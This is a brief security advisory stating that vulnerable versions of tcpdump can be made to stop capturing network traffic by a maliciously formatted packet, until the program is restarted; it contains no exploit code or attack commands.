It has been reported that tcpdump is vulnerable to a denial of service when some packet types are received. By sending a maliciously formatted packet to a system using a vulnerable version of tcpdump, it is possible for a remote user to cause tcpdump to ignore network traffic from the time the packet is received until the application is terminated and restarted.
